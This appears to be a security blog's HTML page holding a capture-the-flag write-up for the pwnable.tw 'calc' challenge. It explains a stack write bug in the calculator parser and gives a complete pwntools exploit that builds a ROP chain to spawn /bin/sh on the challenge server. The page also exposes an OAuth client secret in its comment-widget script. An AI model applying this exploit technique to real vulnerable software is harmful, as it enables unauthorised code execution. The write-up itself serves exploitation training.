@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    zhsh
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+<meta name="author" content="zhsh">
+<meta name="description" content="move fast and break things">
+<meta name="keywords" content="zhsh,zhsh9,security">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://zhsh9.info/styles/main.css" />
+<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+        <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+        <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+        <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+        <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+        
+            <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://zhsh9.info">
+                    zhsh
+                </a>
+            </div>
+            <div id="tp-weather-widget"></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        Home
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        Blog
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        Tag
+                    </a>
+                    
+                    <a class="menu-item" href="https://htbwp.readthedocs.io/en/latest/">
+                        HackTheBox
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        About
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1711375148653" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://zhsh9.info">
+                            zhsh
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1711375148653" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            Home
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            Blog
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            Tag
+                        </a>
+                        
+                        <a class="menu-item" href="https://htbwp.readthedocs.io/en/latest/">
+                            HackTheBox
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            About
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+
+    
+    <div id="tp-weather-widget"></div>
+    <script>
+      (function(a,h,g,f,e,d,c,b){b=function(){d=h.createElement(g);c=h.getElementsByTagName(g)[0];d.src=e;d.charset="utf-8";d.async=1;c.parentNode.insertBefore(d,c)};a["SeniverseWeatherWidgetObject"]=f;a[f]||(a[f]=function(){(a[f].q=a[f].q||[]).push(arguments)});a[f].l=+new Date();if(a.attachEvent){a.attachEvent("onload",b)}else{a.addEventListener("load",b,false)}}(window,document,"script","SeniverseWeatherWidget","//cdn.sencdn.com/widget2/static/js/bundle.js?t="+parseInt((new Date().getTime() / 100000000).toString(),10)));
+      window.SeniverseWeatherWidget('show', {
+        flavor: "slim",
+        location: "WX4FBXXFKE4F",
+        geolocation: true,
+        language: "en",
+        unit: "c",
+        theme: "auto",
+        token: "a44a1d0f-abbb-4739-a53e-603c97094c4c",
+        hover: "disabled",
+        container: "tp-weather-widget"
+      });
+      var cnt = document.getElementsByClassName('sw-card-slim-container');
+      cnt.classList.add('ignore-css');
+    </script>
+
+
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                Challenge 4. calc (pwntable.tw)
+                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        zhsh
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2022-04-16</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">3.2
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">517</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://zhsh9.info/tag/v6fcRAOlh/">Pwn</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <h1 id="0x1-exploration">0x1 Exploration</h1>
+<pre><code class="language-Markdown">❯ checksec calc
+[*] '/home/eclipse/pwnable.tw/4.calc/calc'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>program execution flow:<br>
+main -&gt; calc function -&gt; parse_expr(expr, res_calc)<br>
+Find a program segment:</p>
+<pre><code class="language-c">switch ( *(_BYTE *)(i + expr) )
+        {
+          case '%':
+          case '*':
+          case '/':
+            if ( operand_s[v6] != '+' &amp;&amp; operand_s[v6] != '-' )
+              goto LABEL_14;
+            operand_s[++v6] = *(_BYTE *)(i + expr);
+            break;
+          case '+':
+          case '-':
+LABEL_14:
+            eval(res_tmp_calc, operand_s[v6]);  // Calc: +, -
+                                                // In these cases: +, - is also considered as single operator !!!
+            operand_s[v6] = *(_BYTE *)(i + expr);
+            break;
+          default:
+            eval(res_tmp_calc, operand_s[v6--]);// Calc: *, /, %
+            break;
+        }
+</code></pre>
+<p>Then, we can find:<br>
+When inputing: '+' + OFFSET + '+' + DATA+'\n', then mem(stack) is changed.<br>
+DATA: DWORD<br>
+OFFSET: DWORD (need to be calculated)<br>
+So, the thought is to cover return address of main function and make use of ROP to getshell.<br>
+<img src="https://zhsh9.info/post-images/1650111348011.png" alt="" loading="lazy"></p>
+<p>What printf function prints out in calc is the calculated value where we can cover.<br>
+offset: <code>calc_ebp + (eax) * 4 - 0x59c = main_ebp → eax</code></p>
+<h1 id="0x2-find-offset">0x2 Find offset</h1>
+<p>main():<br>
+<img src="https://zhsh9.info/post-images/1650111515110.png" alt="" loading="lazy"><br>
+calc():<br>
+<img src="https://zhsh9.info/post-images/1650111523043.png" alt="" loading="lazy"><br>
+<img src="https://zhsh9.info/post-images/1650111534996.png" alt="" loading="lazy"><br>
+Then,<br>
+0xff8ccb88 + (eax) * 4 - 0x59c = 0xff8ccba8<br>
+offset = hex(int(( 0xff8ccba8 - 0xff8ccb88 + 0x59c ) / 4)) = 0x16f.<br>
+So, the return address is stored in offset (0x16f + 1 = 0x170).</p>
+<h1 id="0x3-find-gadgets-and-rop-chain">0x3 Find gadgets and ROP chain</h1>
+<p>Referece:<br>
+http://www.phobosys.de/blog_january_20.html<br>
+https://medium.com/@sagidana/calc-pwnable-tw-ef5450f40253</p>
+<p>Payload:</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# author: eclipse
+
+from pwn import *
+
+# ! Configuration
+REMOTE = 1
+binfile = './calc'
+ip, port = 'chall.pwnable.tw', 10100
+context(os='linux', arch='i386', log_level='debug')
+# ! Initialization
+def conn():
+    if REMOTE == 1: io = remote(ip, port)
+    else: io = process(binfile)
+    return io
+
+
+def get_shellcode():
+    p = []
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec060) # @ .data
+    p.append(0x0805c34b) # pop eax ; ret
+    p.append(0x6e69622f) # 'bin'
+    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec064) # @ .data + 4
+    p.append(0x0805c34b) # pop eax ; ret
+    p.append(0x68732f2f) # '//sh'
+    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec068) # @ .data + 8
+    p.append(0x080550d0) # xor eax, eax ; ret
+    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+    p.append(0x080481d1) # pop ebx ; ret
+    p.append(0x080ec060) # @ .data
+    p.append(0x080701d1) # pop ecx ; pop ebx ; ret
+    p.append(0x080ec068) # @ .data + 8
+    p.append(0x080ec060) # padding without overwrite ebx
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec068) # @ .data + 8
+    p.append(0x080550d0) # xor eax, eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x08049a21) # int 0x80
+    return p
+
+
+def write_dword(offset, data):
+    return (&quot;+&quot; + str(0x170 + offset) + &quot;+&quot; + str(data) + &quot;+\n&quot;)
+
+
+# ! Exploitation
+def pwn():
+    io, elf = conn(), ELF(binfile)
+    payload_list = get_shellcode()
+    for i, pl in enumerate(payload_list):
+        payload = write_dword(i, pl)
+        io.send(payload)
+        io.recvline()
+    io.sendline()
+    io.interactive()
+
+if __name__ == &quot;__main__&quot;:
+    pwn()
+</code></pre>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#0x1-exploration">0x1 Exploration</a></li>
+<li><a href="#0x2-find-offset">0x2 Find offset</a></li>
+<li><a href="#0x3-find-gadgets-and-rop-chain">0x3 Find gadgets and ROP chain</a></li>
+</ul>
+
+                            </div>
+                            
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>zhsh</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://zhsh9.info/post/YCimSbE1r/">https://zhsh9.info/post/YCimSbE1r/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://zhsh9.info/post/YCimSbE1r/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://zhsh9.info/post/YCimSbE1r/&sharesource=qzone&title=Challenge 4. calc (pwntable.tw)&pics=https://zhsh9.info/images/avatar.png?v=1711375148653&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://zhsh9.info/post/YCimSbE1r/&sharesource=weibo&title=Challenge 4. calc (pwntable.tw) + " - " + &pic="https://zhsh9.info/images/avatar.png?v=1711375148653 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://zhsh9.info/tag/v6fcRAOlh/">#
+                                                Pwn
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://zhsh9.info/post/2JAgwV_kT/">
+                                                                                            Challenge 5. 3x17 (pwnable.tw)
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://zhsh9.info/post/SSxx8JVxj/">
+                                                                                                    Clustering in Machine Learning: k-means Algorithm
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '11cf267617fbe2c71c94',
+        clientSecret: '3954c3a0371c9a9927394d5f3c259c3239ce6c69',
+        repo: 'zhsh9.github.io',
+        owner: 'zhsh9',
+        admin: ['zhsh9'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+                            
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        zhsh &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.6
+                </div>
+                
+                    <script>
+                        var port = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+                    
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1711375148653);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
